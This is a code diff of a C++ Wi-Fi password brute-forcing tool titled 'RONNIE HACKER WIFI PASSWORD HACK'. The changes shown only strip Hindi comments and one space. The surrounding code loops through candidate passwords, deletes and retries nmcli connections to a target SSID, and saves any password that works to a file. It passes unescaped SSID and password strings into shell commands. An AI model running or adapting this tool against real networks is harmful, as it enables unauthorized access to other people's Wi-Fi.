@@ -15,7 +15,7 @@ using namespace std;
 
 int main() {
     cout << CYAN << BOLD << "===========================================" << endl;
-    cout << "        RONNIE HACKER WIFI PASSWORD  HACK      " << endl;
+    cout << "        RONNIE HACKER WIFI PASSWORD HACK      " << endl;
     cout << "===========================================" << RESET << endl;
 
     wireless_scan_head head;
@@ -75,10 +75,10 @@ int main() {
         cout <<RED<<line_number << current_password.length() << "] "
              << "TRYING: " << current_password << flush;
 
-        // पुराने प्रोफाइल हटाना ज़रूरी है ताकि नया पासवर्ड रजिस्टर हो सके
+      
         system(("nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1").c_str());
 
-        // 'nmcli' connect command - बिना '--wait' के कभी-कभी गलत रिस्पॉन्स आता है
+    
         string command = "nmcli dev wifi connect \"" + target_ssid + 
                          "\" password \"" + current_password + "\" > /dev/null 2>&1";
         
@@ -89,7 +89,7 @@ int main() {
             cout << GREEN << BOLD << "\n[+] Sahi Password Mil Gaya: " << current_password << RESET << endl;
             cout << GREEN << "[+] Wifi " << target_ssid << " se connect ho gaya hai!" << RESET << endl;
 
-            // पासवर्ड सेव करें
+          
             ofstream saveFile("found_password.txt", ios::app);
             if (saveFile.is_open()) {
                 saveFile << "SSID: " << target_ssid << " | Password: " << current_password << endl;
@@ -102,7 +102,7 @@ int main() {
             cout << RED << " -> [FAILED]" << RESET << endl;
         }
         
-        // अगले पासवर्ड से पहले कार्ड को थोड़ा समय दें
+      
         //usleep(10);
        // usleep(500000); 
     }
